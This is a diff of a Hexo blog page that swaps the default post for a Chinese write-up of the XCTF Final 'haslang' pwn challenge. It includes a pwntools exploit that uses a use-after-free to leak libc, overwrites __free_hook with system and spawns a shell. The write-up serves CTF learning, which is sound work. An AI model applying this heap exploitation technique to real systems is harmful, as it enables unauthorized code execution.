@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Hello World |  H.greed</title>
+      <title>xctf-final第七届-haslang |  H.greed</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-hello-world"
+  id="post-xctf-final第七届-haslang"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Hello World
+  xctf-final第七届-haslang
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2021/09/14/hello-world/" class="article-date">
-  <time datetime="2021-09-14T15:28:06.539Z" itemprop="datePublished">2021-09-14</time>
+      <a href="/2023/03/30/xctf-final%E7%AC%AC%E4%B8%83%E5%B1%8A-haslang/" class="article-date">
+  <time datetime="2023-03-30T14:24:38.000Z" itemprop="datePublished">2023-03-30</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">75</span>
+            <span class="post-count">587</span>
         </span>
     </span>
 
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
@@ -105,21 +105,20 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+  <p>不是很有学习价值的题目</p>
 <span id="more"></span>
 
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>报错发现是lisp解释器，直接提取字符串去了，1k多个函数正常人都不会去逆向</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -t x ./haslang | grep -E &#x27;[[:alnum:]]&#x27; &gt;sym.txt </span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>发现存在alloc,free,editChunk,showChunk可以使用，</p>
+<p>alloc和free都是正常的lisp语法，就editChunk麻烦了点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#(define ptr1 (alloc 1168))</span><br><span class="line">#(free ptr1)</span><br><span class="line">#(showChunk ptr1)</span><br><span class="line">#(editChunk ptr1 0 1)</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>ptr1只是变量名，可以创建不同变量名的堆块，alloc大小和edit的数据只能是十进制整型，所以exp还要数据处理，而且他的show只show可以见字符，不可见的直接忽略，libc泄露还要爆破。</p>
+<p>editChunk的 0是下标，一个内存片段8个字节坐标就是0-7，第三个参数就是写入数据</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#strings -t x ./haslang | grep -E &#x27;[[:alnum:]]&#x27; &gt;sym.txt </span></span><br><span class="line"><span class="comment"># patchelf --set-interpreter ./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/ld-2.27.so --set-rpath ./glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64 haslang </span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./haslang&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#(define ptr1 (alloc 1168))</span></span><br><span class="line"><span class="comment">#(free ptr1)</span></span><br><span class="line"><span class="comment">#(showChunk ptr1)</span></span><br><span class="line"><span class="comment">#(editChunk ptr1 0 1)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">who, size</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;(define &#x27;</span> + <span class="built_in">str</span>(who) + <span class="string">&#x27; (alloc &#x27;</span> + <span class="built_in">str</span>(size) + <span class="string">&#x27;))&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">who</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;(free &#x27;</span> + <span class="built_in">str</span>(who) + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">who, idx, what</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;(editChunk &#x27;</span> + <span class="built_in">str</span>(who) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(idx) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(what) + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">who</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="string">&#x27;(showChunk &#x27;</span> + <span class="built_in">str</span>(who) + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">r</span>):</span></span><br><span class="line">	add(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="string">&#x27;ptr1&#x27;</span>, <span class="number">0x500</span>)</span><br><span class="line">	add(<span class="string">&#x27;ptr2&#x27;</span>, <span class="number">0x20</span>)</span><br><span class="line">	add(<span class="string">&#x27;ptr3&#x27;</span>, <span class="number">0x20</span>)</span><br><span class="line">	edit(<span class="string">&#x27;ptr3&#x27;</span>,<span class="number">0</span>,<span class="number">0x73</span>)<span class="comment">#s</span></span><br><span class="line">	edit(<span class="string">&#x27;ptr3&#x27;</span>,<span class="number">1</span>,<span class="number">0x68</span>)<span class="comment">#h</span></span><br><span class="line">	free(<span class="string">&#x27;ptr1&#x27;</span>)</span><br><span class="line">	show(<span class="string">&#x27;ptr1&#x27;</span>)</span><br><span class="line">	leak=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">0x100</span>+<span class="number">0xa0</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">	free(<span class="string">&#x27;ptr0&#x27;</span>)</span><br><span class="line">	edit(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">	edit(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">9</span>,<span class="number">0</span>)</span><br><span class="line">	edit(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">	free(<span class="string">&#x27;ptr0&#x27;</span>)</span><br><span class="line">	base=leak-<span class="number">0xdb4ca0</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">	hook=base+<span class="number">0xdb68e8</span></span><br><span class="line">	sys=base+<span class="number">0xa18420</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(hook))</span><br><span class="line">	addr = <span class="built_in">int</span>(<span class="built_in">hex</span>(hook),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 将每个字节转为十进制</span></span><br><span class="line">	dec_list = <span class="built_in">list</span>((addr.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec_list)):</span><br><span class="line">	    edit(<span class="string">&#x27;ptr0&#x27;</span>, i, dec_list[i])</span><br><span class="line">	show(<span class="string">&#x27;ptr0&#x27;</span>)</span><br><span class="line">	leak=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))*<span class="number">0x10</span>+<span class="number">0xa0</span></span><br><span class="line">	add(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">0x20</span>)</span><br><span class="line">	add(<span class="string">&#x27;ptr0&#x27;</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	addr = <span class="built_in">int</span>(<span class="built_in">hex</span>(sys),<span class="number">16</span>)</span><br><span class="line">	<span class="comment"># 将每个字节转为十进制</span></span><br><span class="line">	dec_list = <span class="built_in">list</span>((addr.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)))</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dec_list)):</span><br><span class="line">	    edit(<span class="string">&#x27;ptr0&#x27;</span>, i, dec_list[i])</span><br><span class="line">	free(<span class="string">&#x27;ptr3&#x27;</span>)<span class="comment">#system(&#x27;sh&#x27;)</span></span><br><span class="line">	r.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		r = process(<span class="string">&#x27;./haslang&#x27;</span>)</span><br><span class="line">		exp(r)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		r.close()</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
  
       <!-- reward -->
       
@@ -184,7 +183,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/09/14/hello-world/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2023/03/30/xctf-final%E7%AC%AC%E4%B8%83%E5%B1%8A-haslang/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -195,19 +194,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            整数溢出unlink
-          
-        </div>
-      </a>
     
-    
-      <a href="/2021/08/29/how2heap/" class="article-nav-link">
+      <a href="/2022/11/24/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">how2heap</div>
+        <div class="article-nav-title">闲言碎语</div>
       </a>
     
   </nav>
